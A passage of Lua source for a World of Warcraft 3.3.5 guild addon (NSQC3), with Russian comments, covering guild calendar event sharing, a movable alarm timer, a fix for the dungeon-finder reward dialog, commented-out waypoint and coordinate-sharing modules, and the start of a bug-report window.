                name = name,
                level = level,
                class = class,
                publicNote = note or "",
                officerNote = officerNote or ""
            })
        end
    end

    return guildInfo
end

----------------------------------------------------------------------------
-- NSQC3 = {}
-- NSQC3.waypoints = {}
-- NSQC3.overlay = {}
-- NSQC3.calib = {}  -- { screenTopLeft, mapTopLeft, mapBottomRight }
-- NSQC3.mode = "idle" -- "idle", "calibrating", "tracking"

-- -- Восстанавливаем обработчик при каждом обновлении карты
-- local frame = CreateFrame("Frame")
-- frame:RegisterEvent("WORLD_MAP_UPDATE")
-- frame:SetScript("OnEvent", function()
--     if WorldMapFrame:IsVisible() then
--         NSQC3:AttachClickHandler()
--     end
-- end)

-- function NSQC3:AttachClickHandler()
--     if not WorldMapButton or not WorldMapButton:IsVisible() then return end

--     WorldMapButton:SetScript("OnMouseUp", function(_, button)
--         if button ~= "LeftButton" then return end

--         local cursorX, cursorY = GetCursorPosition()
--         local uiScale = UIParent:GetEffectiveScale()
--         cursorX = cursorX / uiScale
--         cursorY = cursorY / uiScale

--         if NSQC3.mode == "idle" then
--             NSQC3.calib = {}
--             NSQC3.waypoints = {}
--             NSQC3.mode = "calibrating"
--             table.insert(NSQC3.calib, {x = cursorX, y = cursorY})
--             print("NSQC3: Клик 1/3 — отметьте ЛЕВЫЙ ВЕРХНИЙ УГОЛ ЭКРАНА ИГРЫ (где начинается UI)")
--             NSQC3:ClearOverlay()
--         elseif NSQC3.mode == "calibrating" then
--             table.insert(NSQC3.calib, {x = cursorX, y = cursorY})
--             if #NSQC3.calib == 2 then
--                 print("NSQC3: Клик 2/3 — отметьте ЛЕВЫЙ ВЕРХНИЙ УГОЛ КАРТЫ")
--             elseif #NSQC3.calib == 3 then
--                 NSQC3.mode = "tracking"
--                 print("NSQC3: Калибровка завершена. Следующие клики — точки маршрута.")
--             end
--         elseif NSQC3.mode == "tracking" then
--             -- Преобразуем в (0..1) относительно карты
--             local screenTL = NSQC3.calib[1]  -- левый верх экрана
--             local mapTL   = NSQC3.calib[2]  -- левый верх карты
--             local mapBR   = NSQC3.calib[3]  -- правый низ карты

--             -- Смещение относительно левого верха карты
--             local dx = cursorX - mapTL.x
--             local dy = cursorY - mapTL.y

--             -- Размеры карты в пикселях
--             local mapWidth  = mapBR.x - mapTL.x
--             local mapHeight = mapBR.y - mapTL.y

--             if mapWidth == 0 or mapHeight == 0 then return end

--             local normX = dx / mapWidth
--             local normY = dy / mapHeight

--             table.insert(NSQC3.waypoints, {x = normX, y = normY})
--             print("NSQC3: Added waypoint", #NSQC3.waypoints, string.format("(%.3f, %.3f)", normX, normY))
--         end
--     end)
-- end

-- function NSQC3:ClearOverlay()
--     if not NSQC3.overlay then NSQC3.overlay = {} end
--     for i, tex in pairs(NSQC3.overlay) do
--         if tex and tex:IsObjectType("Texture") then
--             tex:Hide()
--         end
--     end
--     wipe(NSQC3.overlay)
-- end

-- function NSQC3:DrawWaypoints(from, to)
--     if NSQC3.mode ~= "tracking" then
--         print("NSQC3: Сначала завершите калибровку (3 клика)!")
--         return
--     end

--     NSQC3:ClearOverlay()
--     from = from or 1
--     to = to or #NSQC3.waypoints
--     from = math.max(1, from)
--     to = math.min(#NSQC3.waypoints, to)

--     local mapTL = NSQC3.calib[2]
--     local mapBR = NSQC3.calib[3]
--     if not mapTL or not mapBR then return end

--     local mapWidth  = mapBR.x - mapTL.x
--     local mapHeight = mapBR.y - mapTL.y

--     for i = from, to do
--         local wp = NSQC3.waypoints[i]
--         -- Восстанавливаем абсолютную позицию на экране
--         local screenX = mapTL.x + wp.x * mapWidth
--         local screenY = mapTL.y + wp.y * mapHeight

--         -- Позиционируем относительно WorldMapButton
--         local left = WorldMapButton:GetLeft()
--         local top = WorldMapButton:GetTop()
--         local relX = screenX - left
--         local relY = top - screenY  -- Y растёт вниз

--         local tex = WorldMapButton:CreateTexture(nil, "OVERLAY")
--         tex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\121212.tga")
--         tex:SetWidth(6)
--         tex:SetHeight(6)
--         tex:SetPoint("CENTER", WorldMapButton, "TOPLEFT", relX, -relY)
--         tex:Show()
--         NSQC3.overlay[i] = tex
--     end
-- end

-- -- Команды
-- SLASH_NSQC31 = "/nsqc3"
-- SlashCmdList["NSQC3"] = function(msg)
--     local args = {}
--     for word in msg:gmatch("%S+") do table.insert(args, word) end
--     local cmd = (args[1] or ""):lower()

--     if cmd == "draw" then
--         NSQC3:DrawWaypoints(tonumber(args[2]), tonumber(args[3]))
--     elseif cmd == "clear" then
--         NSQC3:ClearOverlay()
--     elseif cmd == "count" or cmd == "" then
--         print("NSQC3 waypoints:", #NSQC3.waypoints)
--         print("Mode:", NSQC3.mode)
--         if NSQC3.mode == "calibrating" then
--             print("Калибровка:", #NSQC3.calib, "/ 3")
--         end
--     elseif cmd == "list" then
--         for i, wp in ipairs(NSQC3.waypoints) do
--             print(i, string.format("(%.3f, %.3f)", wp.x, wp.y))
--         end
--     elseif cmd == "reset" then
--         NSQC3.waypoints = {}
--         NSQC3.calib = {}
--         NSQC3.mode = "idle"
--         NSQC3:ClearOverlay()
--         print("NSQC3: Сброшено. Откройте карту и начните с КЛИКА 1 (левый верх экрана).")
--     else
--         print("/nsqc3 [count|draw|clear|list|reset]")
--         print("Калибровка:")
--         print("1. Клик: левый верх экрана (где начинается UI)")
--         print("2. Клик: левый верх карты")
--         print("3. Клик: правый низ карты")
--         print("4+. Клики: точки маршрута")
--     end
-- end

-- NSQC3.overlay = {}


-- === NSQC3 CALENDAR CLIENT (RELEASE) ===
local function CreateCustomButton()
    if _G.CustomCalendarCreateButton then return end

    local origButton = _G.CalendarCreateEventCreateButton
    if not origButton then return end

    local calEventFrame = _G.CalendarCreateEventFrame
    if not calEventFrame or not calEventFrame:IsVisible() then return end

    local btn = CreateFrame("Button", "CustomCalendarCreateButton", calEventFrame, "UIPanelButtonTemplate")
    btn:SetPoint("CENTER", origButton, "CENTER")
    btn:SetSize(origButton:GetWidth(), origButton:GetHeight())
    btn:SetText(origButton:GetText() or "Создать")

    origButton:Hide()

    btn:SetScript("OnClick", function(self, mouseButton)
        local title = (_G.CalendarCreateEventTitleEdit and _G.CalendarCreateEventTitleEdit:GetText()) or ""
        local desc = (_G.CalendarCreateEventDescriptionEdit and _G.CalendarCreateEventDescriptionEdit:GetText()) or ""
        local hour = (_G.CalendarCreateEventHourDropDown and _G.CalendarCreateEventHourDropDown.selectedValue) or 0
        local min = (_G.CalendarCreateEventMinuteDropDown and _G.CalendarCreateEventMinuteDropDown.selectedValue) or 0

        local calFrame = _G.CalendarFrame
        local selYear = calFrame and calFrame.selectedYear
        local selMonth = calFrame and calFrame.selectedMonth
        local selDay = calFrame and calFrame.selectedDay
        if not (selYear and selMonth and selDay) then
            local t = date("*t")
            selYear, selMonth, selDay = t.year, t.month, t.day
        end
        local eventDateStr = string.format("%04d-%02d-%02d", selYear, selMonth, selDay)
        local timeStr = string.format("%02d%02d", hour, min)

        if title == "" then return end

        local payload = eventDateStr .. "|" .. timeStr .. "|" .. title .. "|" .. desc

        -- Безопасный размер чанка (254 - запас на заголовок "i/total|")
        local MAX_CHUNK_SIZE = 200
        local chunks = {}
        local i = 1
        while i <= #payload do
            table.insert(chunks, payload:sub(i, i + MAX_CHUNK_SIZE - 1))
            i = i + MAX_CHUNK_SIZE
        end

        local total = #chunks
        for idx = 1, total do
            local msg = string.format("%d/%d|%s", idx, total, chunks[idx])
            if #msg <= 254 then
                SendAddonMessage("ns_calendar", msg, "GUILD")
            end
        end

        -- Оригинальное создание события
        local origOnClick = origButton:GetScript("OnClick")
        if origOnClick then
            origOnClick(origButton, mouseButton)
        elseif _G.CalendarCreateEventButton_Click then
            _G.CalendarCreateEventButton_Click()
        end
    end)
end

-- Хук на появление формы создания
local monitor = CreateFrame("Frame")
monitor:SetScript("OnUpdate", function(self, elapsed)
    self.t = (self.t or 0) + elapsed
    if self.t > 0.3 then
        local f = _G.CalendarCreateEventFrame
        if f and not f.ns_hooked then
            f.ns_hooked = true
            f:HookScript("OnShow", function()
                local d = CreateFrame("Frame")
                d:SetScript("OnUpdate", function(_, dt)
                    d.t = (d.t or 0) + dt
                    if d.t > 0.05 then
                        CreateCustomButton()
                        d:SetScript("OnUpdate", nil)
                    end
                end)
            end)
        end
        self.t = 0
    end
end)
-- === END CLIENT ===

-- === NSQC3: CALENDAR CONTEXT MENU WITH TWO BUTTONS (WoW 3.3.5 compatible) ===
if _G.NSQC3_CALENDAR_MENU_HOOKED then return end
_G.NSQC3_CALENDAR_MENU_HOOKED = true

-- Вспомогательная функция: отправка чанками
local function SendAddonMessageChunked(prefix, payload, channel)
    if not payload or payload == "" then return end
    local MAX_CHUNK_SIZE = 200
    local chunks = {}
    local i = 1
    while i <= #payload do
        table.insert(chunks, payload:sub(i, i + MAX_CHUNK_SIZE - 1))
        i = i + MAX_CHUNK_SIZE
    end

    local total = #chunks
    for idx = 1, total do
        local msg = string.format("%d/%d|%s", idx, total, chunks[idx])
        if #msg <= 254 then
            SendAddonMessage(prefix, msg, channel)
        end
    end
end

-- Создаём служебный фрейм для таймеров
local NSQC3_TimerFrame = CreateFrame("Frame")
NSQC3_TimerFrame.timers = {}

function NSQC3_TimerFrame:StartTimer(delay, callback)
    local timer = {
        startTime = GetTime(),
        delay = delay,
        callback = callback,
        active = true
    }
    table.insert(self.timers, timer)
    self:Show()
end

function NSQC3_TimerFrame:OnUpdate(elapsed)
    local now = GetTime()
    local i = #self.timers
    while i >= 1 do
        local t = self.timers[i]
        if t.active and now - t.startTime >= t.delay then
            t.active = false
            t.callback()
            table.remove(self.timers, i)
        end
        i = i - 1
    end
    if #self.timers == 0 then
        self:Hide()
    end
end

NSQC3_TimerFrame:SetScript("OnUpdate", NSQC3_TimerFrame.OnUpdate)
NSQC3_TimerFrame:Hide()

-- Замена C_Timer.After
local function NSQC3_After(delay, callback)
    NSQC3_TimerFrame:StartTimer(delay, callback)
end

local function TryHookContextMenu()
    if not _G.CalendarContextMenu then
        NSQC3_After(0.1, TryHookContextMenu)
        return
    end

    if _G.CalendarContextMenu.ns_hooked then return end

    local orig_OnShow = _G.CalendarContextMenu:GetScript("OnShow")
    _G.CalendarContextMenu:SetScript("OnShow", function(self)
        if orig_OnShow then orig_OnShow(self) end

        NSQC3_After(0.02, function()
            -- === КНОПКА 1: Удалить с сервера (через CreateEventFrame) ===
            local btnDel = _G["CalendarContextMenuButton7"]
            if btnDel then
                btnDel:SetText("Удалить с сервера")
                btnDel:Show()

                if not btnDel.ns_hooked_del then
                    btnDel:SetScript("OnClick", function()
                        local createFrame = _G.CalendarCreateEventFrame
                        if not (createFrame and createFrame:IsVisible()) then
                            DEFAULT_CHAT_FRAME:AddMessage("|cffff0000[NSQC3] Окно редактирования не открыто.|r")
                            HideUIPanel(_G.CalendarContextMenu)
                            return
                        end

                        local title = (_G.CalendarCreateEventTitleEdit and _G.CalendarCreateEventTitleEdit:GetText()) or ""
                        if title == "" then
                            DEFAULT_CHAT_FRAME:AddMessage("|cffff0000[NSQC3] Название пусто.|r")
                            HideUIPanel(_G.CalendarContextMenu)
                            return
                        end

                        local calFrame = _G.CalendarFrame
                        local year, month, day = calFrame.selectedYear, calFrame.selectedMonth, calFrame.selectedDay
                        if not (year and month and day) then
                            local t = date("*t")
                            year, month, day = t.year, t.month, t.day
                        end
                        local dateStr = string.format("%04d-%02d-%02d", year, month, day)

                        SendAddonMessage("ns_calendar_del", dateStr .. "|" .. title, "GUILD")
                        DEFAULT_CHAT_FRAME:AddMessage("|cff00ff00[NSQC3] Удалено: " .. dateStr .. " | " .. title .. "|r")
                        HideUIPanel(_G.CalendarContextMenu)
                    end)
                    btnDel.ns_hooked_del = true
                end
            end

            -- === КНОПКА 2: Добавить чужое (через eventIndex из контекста меню) ===
            local btnAlien = _G["CalendarContextMenuButton8"]
            local eventButton = self.eventButton
            if btnAlien and eventButton and eventButton.eventIndex then
                btnAlien:SetText("Добавить чужое")
                btnAlien:Show()

                if not btnAlien.ns_hooked_alien then
                    btnAlien:SetScript("OnClick", function()
                        local eventIndex = eventButton.eventIndex
                        local eventInfo = { CalendarGetEventInfo(eventIndex) }
                        if #eventInfo < 11 then
                            DEFAULT_CHAT_FRAME:AddMessage("|cffff0000[NSQC3] Недостаточно данных события.|r")
                            HideUIPanel(_G.CalendarContextMenu)
                            return
                        end

                        local title = eventInfo[1] or ""
                        local desc = eventInfo[2] or ""
                        local creator = eventInfo[3] or ""
                        local month = eventInfo[9]
                        local day = eventInfo[10]
                        local year = eventInfo[11]
                        local hour = eventInfo[12] or 0
                        local min = eventInfo[13] or 0

                        if title == "" or not (year and month and day) then
                            DEFAULT_CHAT_FRAME:AddMessage("|cffff0000[NSQC3] Некорректные данные события.|r")
                            HideUIPanel(_G.CalendarContextMenu)
                            return
                        end

                        local dateStr = string.format("%04d-%02d-%02d", year, month, day)
                        local timeStr = string.format("%02d%02d", hour, min)
                        local payload = dateStr .. "|" .. timeStr .. "|" .. title .. "|" .. desc .. "|" .. creator

                        SendAddonMessageChunked("ns_alien_event", payload, "GUILD")
                        DEFAULT_CHAT_FRAME:AddMessage("|cff00ff00[NSQC3] Отправлено чужое событие: " .. title .. "|r")
                        HideUIPanel(_G.CalendarContextMenu)
                    end)
                    btnAlien.ns_hooked_alien = true
                end
            else
                if btnAlien then
                    btnAlien:Hide()
                end
            end

            self:SetHeight(158)
        end)
    end)

    _G.CalendarContextMenu.ns_hooked = true
end

TryHookContextMenu()
-- === END ===



-----------------------------------
nsDbc = nsDbc or {}

ns_timerMinutes = 0
ns_timerStart = 0
ns_isAlarming = false
ns_alarmTicker = 0

local tButton

local function CreateTimerButton()
    if tButton then return end

    tButton = CreateFrame("Button", nil, UIParent, "SecureActionButtonTemplate")
    tButton:SetSize(32, 32)
    tButton:EnableMouse(true)
    -- ДОБАВЛЕНО: MiddleButtonUp для обработки клика колесом мыши
    tButton:RegisterForClicks("LeftButtonUp", "RightButtonUp", "MiddleButtonUp")
    tButton:RegisterForDrag("LeftButton")
    tButton:SetMovable(true)
    
    -- ИСПРАВЛЕНИЕ 1: Задаем начальную позицию явно, чтобы избежать дефолтного TOPLEFT
    tButton:SetPoint("CENTER", UIParent, "CENTER", 0, 0)

    tButton:SetBackdrop({
        bgFile = "Interface\\Tooltips\\UI-Tooltip-Background",
        edgeFile = "Interface\\Tooltips\\UI-Tooltip-Border",
        tile = true, tileSize = 16, edgeSize = 16,
        insets = { left = 4, right = 4, top = 4, bottom = 4 }
    })
    tButton:SetBackdropColor(0, 0, 0, 0.8)

    local buttonText = tButton:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    buttonText:SetText("T")
    buttonText:SetPoint("CENTER", tButton, "CENTER")

    tButton:SetScript("OnDragStart", function(self)
        self:StartMoving()
    end)

    tButton:SetScript("OnDragStop", function(self)
        self:StopMovingOrSizing()
        nsDbc["таймер"] = nsDbc["таймер"] or {}
        
        -- ИСПРАВЛЕНИЕ 2: Сохраняем точку привязки вместе с координатами
        local point, _, relativePoint, x, y = self:GetPoint()
        nsDbc["таймер"].point = point
        nsDbc["таймер"].relativePoint = relativePoint
        nsDbc["таймер"].x = x
        nsDbc["таймер"].y = y
        nsDbc["таймер"].visible = true
    end)

    tButton:SetScript("OnEnter", function(self)
        GameTooltip:SetOwner(self, "ANCHOR_RIGHT")
        GameTooltip:SetText("NSQC3 — Таймер", 1, 0.8, 0)
        GameTooltip:AddLine(" ", 1, 1, 1)
        if ns_timerMinutes <= 0 then
            GameTooltip:AddLine("• СТАТУС: ВЫКЛЮЧЕН", 0.5, 0.5, 0.5)
            GameTooltip:AddLine("  ЛКМ: Ввести время и включить", 0.7, 0.7, 0.7)
            GameTooltip:AddLine("  СКМ (Колесо): Мгновенно выключить таймер", 0.7, 0.7, 0.7)
        else
            local currentTime = GetTime()
            local elapsed = currentTime - ns_timerStart
            local targetSeconds = ns_timerMinutes * 60
            if ns_isAlarming then
                GameTooltip:AddLine("• СТАТУС: СИГНАЛ", 1, 0.2, 0.2)
                GameTooltip:AddLine("  Звук проигрывается.", 1, 1, 1)
                GameTooltip:AddLine("  ПКМ: Сбросить и ждать снова.", 0.7, 0.7, 0.7)
            else
                local left = math.ceil(targetSeconds - elapsed)
                if left < 0 then left = 0 end
                local m = math.floor(left / 60)
                local s = left % 60
                GameTooltip:AddLine("• СТАТУС: Ожидание", 0.2, 1, 0.2)
                GameTooltip:AddLine(string.format("  До сигнала: %d мин %d сек", m, s), 1, 1, 1)
                GameTooltip:AddLine("  ПКМ: Перезапустить отсчет.", 0.7, 0.7, 0.7)
            end
            GameTooltip:AddLine(" ", 1, 1, 1)
            GameTooltip:AddLine("Интервал: " .. ns_timerMinutes .. " мин", 0.7, 0.7, 0.7)
        end
        GameTooltip:AddLine(" ", 1, 1, 1)
        GameTooltip:AddLine("• ЛКМ: Изменить время (0 = Выкл)", 1, 1, 1)
        GameTooltip:AddLine("• СКМ (Колесо): Мгновенно выключить таймер", 1, 1, 1)
        GameTooltip:Show()
    end)

    tButton:SetScript("OnLeave", function(self)
        GameTooltip:Hide()
    end)

    local editBox = CreateFrame("EditBox", nil, tButton)
    editBox:SetSize(60, 20)
    editBox:SetPoint("LEFT", tButton, "RIGHT", 5, 0)
    editBox:Hide()
    editBox:SetAutoFocus(false)
    editBox:SetBackdrop({
        bgFile = "Interface\\ChatFrame\\ChatFrameBackground",
        edgeFile = "Interface\\Tooltips\\UI-Tooltip-Border",
        tile = true, tileSize = 16, edgeSize = 12,
        insets = { left = 2, right = 2, top = 2, bottom = 2 }
    })
    editBox:SetBackdropColor(0, 0, 0, 0.8)
    editBox:SetTextColor(1, 1, 1, 1)
    editBox:SetFont(STANDARD_TEXT_FONT, 12)

    editBox:SetScript("OnEnterPressed", function(self)
        local text = self:GetText()
        local num = tonumber(text)
        if num and num >= 0 then
            ns_timerMinutes = num
            nsDbc["таймер"] = nsDbc["таймер"] or {}
            nsDbc["таймер"].time = ns_timerMinutes
            if ns_timerMinutes > 0 then
                ns_timerStart = GetTime()
                ns_isAlarming = false
                ns_alarmTicker = 0
            else
                ns_isAlarming = false
            end
        else
            ns_timerMinutes = 0
            nsDbc["таймер"] = nsDbc["таймер"] or {}
            nsDbc["таймер"].time = 0
        end
        self:Hide()
    end)

    editBox:SetScript("OnEscapePressed", function(self)
        self:Hide()
    end)

    tButton:SetScript("OnClick", function(self, button)
        if button == "LeftButton" then
            editBox:SetText(ns_timerMinutes or 0)
            editBox:Show()
            editBox:SetFocus()
        elseif button == "RightButton" then
            if ns_timerMinutes > 0 then
                ns_timerStart = GetTime()
                ns_isAlarming = false
                ns_alarmTicker = 0
            end
        elseif button == "MiddleButton" then
            -- Аналог ввода 0 и нажатия Enter: мгновенное выключение таймера
            ns_timerMinutes = 0
            nsDbc["таймер"] = nsDbc["таймер"] or {}
            nsDbc["таймер"].time = 0
            ns_timerStart = 0
            ns_isAlarming = false
            ns_alarmTicker = 0
        end
    end)
end

local function LoadSettings()
    local saved = nsDbc["таймер"] or {}
    ns_timerMinutes = saved.time or 0
    if ns_timerMinutes > 0 then
        ns_timerStart = GetTime()
        ns_isAlarming = false
        ns_alarmTicker = 0
    else
        ns_timerStart = 0
        ns_isAlarming = false
    end

    CreateTimerButton()

    local point = saved.point or "CENTER"
    local relativePoint = saved.relativePoint or "CENTER"
    local x = saved.x or 0
    local y = saved.y or 0
    
    tButton:ClearAllPoints()
    -- ИСПРАВЛЕНИЕ 3: Используем сохраненные точки привязки. 
    -- Если их нет (старый сейв), используем CENTER по умолчанию.
    tButton:SetPoint(point, UIParent, relativePoint, x, y)

    if saved.visible then
        tButton:Show()
    else
        tButton:Hide()
    end
end

SLASH_NSTIMER1 = "/nstimer"
SlashCmdList["NSTIMER"] = function()
    if not tButton then
        LoadSettings()
    end
    if tButton:IsShown() then
        tButton:Hide()
        nsDbc["таймер"] = nsDbc["таймер"] or {}
        nsDbc["таймер"].visible = false
    else
        LoadSettings()
        tButton:Show()
        nsDbc["таймер"] = nsDbc["таймер"] or {}
        nsDbc["таймер"].visible = true
    end
end

local initFrame = CreateFrame("Frame")
initFrame.startTime = GetTime()
initFrame:SetScript("OnUpdate", function(self, elapsed)
    if GetTime() - self.startTime >= 5 then
        LoadSettings()
        self:SetScript("OnUpdate", nil)
        initFrame = nil
    end
end)

local f = CreateFrame("Frame")
f:SetScript("OnUpdate", function(self, dt)
    if tButton and GameTooltip:IsVisible() and GameTooltip:GetOwner() == tButton then
        tButton:GetScript("OnEnter")(tButton)
    end

    if ns_timerMinutes <= 0 then return end
    if ns_timerStart == 0 then return end

    local currentTime = GetTime()
    local elapsed = currentTime - ns_timerStart
    local targetSeconds = ns_timerMinutes * 60

    if not ns_isAlarming then
        if elapsed >= targetSeconds then
            ns_isAlarming = true
            PlaySoundFile("Interface\\AddOns\\NSQC3\\libs\\bip.ogg")
        end
    else
        ns_alarmTicker = ns_alarmTicker + dt
        if ns_alarmTicker >= 1.0 then
            ns_alarmTicker = 0
            PlaySoundFile("Interface\\AddOns\\NSQC3\\libs\\bip.ogg")
        end
    end
end)

f:Show()
-----------------------------------------
-- ============================================================================
-- LFDfix - Исправление ошибок LFD для WoW 3.3.5 (Wrath of the Lich King)
-- Версия 15.0: FINAL RELEASE
-- ============================================================================

LFDfixRewardData = LFDfixRewardData or {}
LFDfixIconOffset = 30

-- ============================================================================
-- Создать индикатор СПРАВА от фрейма
-- ============================================================================
local function CreateBagIndicator(texture, anchorFrame)
    if (not texture or not anchorFrame) then return nil end
    
    if (LFDfixIndicatorFrame) then
        LFDfixIndicatorFrame:Hide()
        LFDfixIndicatorFrame = nil
    end
    
    local frame = CreateFrame("Frame", "LFDfixIndicatorFrame", UIParent)
    frame:SetSize(128, 128)
    frame:SetFrameStrata("DIALOG")
    frame:SetFrameLevel(100)
    frame:EnableMouse(false)
    
    local icon = frame:CreateTexture(nil, "OVERLAY")
    icon:SetAllPoints(frame)
    icon:SetTexture(texture)
    icon:Show()
    
    local border = frame:CreateTexture(nil, "BORDER")
    border:SetAllPoints(frame)
    border:SetTexture("Interface\\DialogFrame\\UI-DialogBox-Border")
    border:SetTexCoord(0.2, 0.8, 0.2, 0.8)
    border:SetVertexColor(0, 1, 0, 1)
    border:Show()
    
    frame:ClearAllPoints()
    frame:SetPoint("LEFT", anchorFrame, "RIGHT", LFDfixIconOffset, 0)
    frame:Show()
    
    return frame
end

-- ============================================================================
-- Скрыть индикатор
-- ============================================================================
local function HideBagIndicator()
    if (LFDfixIndicatorFrame) then
        LFDfixIndicatorFrame:Hide()
        LFDfixIndicatorFrame = nil
    end
end

-- ============================================================================
-- Есть ли сумка в наградах подземелья?
-- ============================================================================
local function DoesDungeonHaveBag(dungeonID)
    for i = 1, 10 do
        local name, texture = GetLFGDungeonRewardInfo(dungeonID, i)
        if (name and texture and texture:find("INV_Misc_Bag_17")) then
            return texture, i, name
        end
    end
    return nil, nil, nil
end

-- ============================================================================
-- Получить текстуру из rewardID
-- ============================================================================
local function GetTextureFromRewardID(rewardID)
    local _, _, _, _, _, _, _, _, _, itemTexture = GetItemInfo(rewardID)
    if (itemTexture) then return itemTexture, "item" end
    
    for i = 1, 10 do
        local _, texture = GetLFGDungeonRewardInfo(rewardID, i)
        if (texture) then return texture, "dungeon" end
    end
    
    return nil, nil
end

-- ============================================================================
-- Найти фрейм с эмблемами
-- ============================================================================
local function FindEmblemRewardFrame()
    for i = 2, 4 do
        local frameName = "LFDDungeonReadyDialogRewardsFrameReward" .. i
        local frame = _G[frameName]
        if (frame and frame:IsShown()) then return frame end
    end
    return _G["LFDDungeonReadyDialogRewardsFrameReward2"]
end

-- ============================================================================
-- Переопределение функции
-- ============================================================================
function LFDDungeonReadyDialogReward_SetReward(rewardFrame, reward)
    if (not rewardFrame or not reward) then return end

    local texture = nil
    local rewardID = nil
    local dungeonID = nil
    local fixWasNeeded = false

    -- Проверка: Был ли баг?
    if (type(reward) == "number") then
        fixWasNeeded = true
        rewardID = reward
        dungeonID = reward
        texture = GetTextureFromRewardID(rewardID)
    elseif (type(reward) == "table") then
        texture = reward.texture
        rewardID = reward.rewardID
        dungeonID = reward.dungeonID
        if (not texture and rewardID) then
            texture = GetTextureFromRewardID(rewardID)
        end
    end

    -- Индикатор: ТОЛЬКО если фикс сработал И сумка есть в наградах
    if (fixWasNeeded and dungeonID) then
        local bagTexture = DoesDungeonHaveBag(dungeonID)
        if (bagTexture) then
            local emblemFrame = FindEmblemRewardFrame()
            CreateBagIndicator(bagTexture, emblemFrame or rewardFrame)
        end
    end

    -- Применение фикса
    if (texture and rewardFrame.texture) then
        rewardFrame.texture:SetTexture(texture)
        rewardFrame.texture:Show()
    elseif (rewardFrame.texture) then
        rewardFrame.texture:Hide()
    end

    if (rewardFrame.border) then
        rewardFrame.border:SetTexture("Interface\\LFGFrame\\UI-LFG-ICON-LOOT")
        rewardFrame.border:Show()
    end

    if (texture and rewardFrame.portrait) then
        SetPortraitToTexture(rewardFrame.portrait, texture)
        rewardFrame.portrait:Show()
    elseif (rewardFrame.portrait) then
        rewardFrame.portrait:Hide()
    end

    -- Tooltip
    LFDfixRewardData[rewardFrame:GetName()] = {
        dungeonID = dungeonID,
        texture = texture,
        rewardID = rewardID
    }
    
    rewardFrame:SetScript("OnEnter", function(self)
        local data = LFDfixRewardData[self:GetName()]
        if (data and data.dungeonID) then
            local tt = self.tooltip or GameTooltip
            if (tt) then
                pcall(function()
                    tt:SetOwner(self, "ANCHOR_RIGHT")
                    tt:SetLFGDungeonReward(data.dungeonID, 1)
                end)
            end
        end
    end)
    
    rewardFrame:SetScript("OnLeave", function(self)
        local tt = self.tooltip or GameTooltip
        if (tt) then tt:Hide() end
    end)

    rewardFrame:Show()
end

-- ============================================================================
-- Скрытие индикатора при закрытии LFD окна
-- ============================================================================
local LFDParentFrame = LFDDungeonReadyDialog or LFDDungeonReadyPopup
if (LFDParentFrame) then
    local origHide = LFDParentFrame.Hide
    LFDParentFrame.Hide = function(self)
        HideBagIndicator()
        return origHide(self)
    end
end

-- ============================================================================
-- Инициализация
-- ============================================================================
local function FixExistingFrames()
    for _, name in ipairs({
        "LFDDungeonReadyDialogRewardsFrameReward1",
        "LFDDungeonReadyDialogRewardsFrameReward2",
        "LFDDungeonReadyDialogRewardsFrameReward3", 
        "LFDDungeonReadyDialogRewardsFrameReward4"
    }) do
        local f = _G[name]
        if (f) then
            f:SetScript("OnLeave", function(self)
                local tt = self.tooltip or GameTooltip
                if (tt) then tt:Hide() end
            end)
        end
    end
end

local initFrame = CreateFrame("Frame")
initFrame:RegisterEvent("ADDON_LOADED")
initFrame:SetScript("OnEvent", function(self, event, name)
    if (name == "LFDfix") then
        FixExistingFrames()
        self:UnregisterEvent("ADDON_LOADED")
    end
end)
--- координаты ---
-- -- GuildCoords.lua
-- -- Версия WoW: 3.3.5

-- local commPrefix = "GCOORDS"
-- local elapsedTime = 0.0

-- local eventFrame = CreateFrame("Frame")
-- eventFrame:RegisterEvent("ADDON_LOADED")
-- eventFrame:SetScript("OnEvent", function(self, event, arg1)
--     if event == "ADDON_LOADED" and arg1 == "GuildCoords" then
--         RegisterAddonMessagePrefix(commPrefix)
--         print("GuildCoords: Загружен. Отправка координат активна.")
--     end
-- end)

-- local timerFrame = CreateFrame("Frame")
-- timerFrame:SetScript("OnUpdate", function(self, elapsed)
--     elapsedTime = elapsedTime + elapsed
--     if elapsedTime >= 1.0 then
--         elapsedTime = 0.0
--         if IsInGuild() then
--             local x, y = GetPlayerMapPosition("player")
--             local zone = GetRealZoneText()
--             local subzone = GetMinimapZoneText()
--             local areaID = GetCurrentMapAreaID() or 0
            
--             -- Отправляем: Зона|Подзона|X|Y|AreaID
--             SendAddonMessage(commPrefix, string.format("%s|%s|%.1f|%.1f|%d", zone, subzone, x * 100, y * 100, areaID), "GUILD")
--         end
--     end
-- end)
-- --- координаты ---

----гитхаб
-- ==========================================
-- Префикс аддона и очередь отправки
-- ==========================================
local BUGS_PREFIX = "ns_bugs"

-- Фрейм для отложенной отправки (эмуляция таймера без C_Timer)
local SendTimerFrame = CreateFrame("Frame")
local sendQueue = {}
local queueIndex = 1
local timeSinceLastSend = 0

SendTimerFrame:Hide()
SendTimerFrame:SetScript("OnUpdate", function(self, elapsed)
    timeSinceLastSend = timeSinceLastSend + elapsed
    if timeSinceLastSend >= 0.01 and queueIndex <= #sendQueue then
        local msg = sendQueue[queueIndex]
        SendAddonMessage("ns_bugsRe", msg, "GUILD")
        print("[DEBUG][ns_bugs] Отправлен пакет " .. queueIndex .. "/" .. #sendQueue)
        queueIndex = queueIndex + 1
        timeSinceLastSend = 0
    end
    if queueIndex > #sendQueue then
        sendQueue = {}
        queueIndex = 1
        timeSinceLastSend = 0
        self:Hide()
    end
end)

-- ==========================================
-- Создание окна интерфейса
-- ==========================================
local function CreateBugReportFrame()
    if _G["BugReportFrame"] then 
        print("[DEBUG] Фрейм уже существует, возвращаем существующий экземпляр.")
        return _G["BugReportFrame"] 
    end
    
    print("[DEBUG] Инициализация BugReportFrame...")

    local frame = CreateFrame("Frame", "BugReportFrame", UIParent)
    frame:SetWidth(768)
    frame:SetHeight(600)
    frame:SetPoint("CENTER")
    frame:SetMovable(true)
    frame:EnableMouse(true)
    frame:RegisterForDrag("LeftButton")
    
    frame:SetScript("OnDragStart", function(self) self:StartMoving() end)
    frame:SetScript("OnDragStop", function(self) self:StopMovingOrSizing() end)
    
    frame:SetBackdrop({
        bgFile = "Interface\\BUTTONS\\WHITE8X8",
        edgeFile = "Interface\\DialogFrame\\UI-DialogBox-Border",
        tile = true,
        tileSize = 32,
        edgeSize = 32,
        insets = { left = 11, right = 12, top = 12, bottom = 11 }
    })
    frame:SetBackdropColor(0, 0, 0, 1)

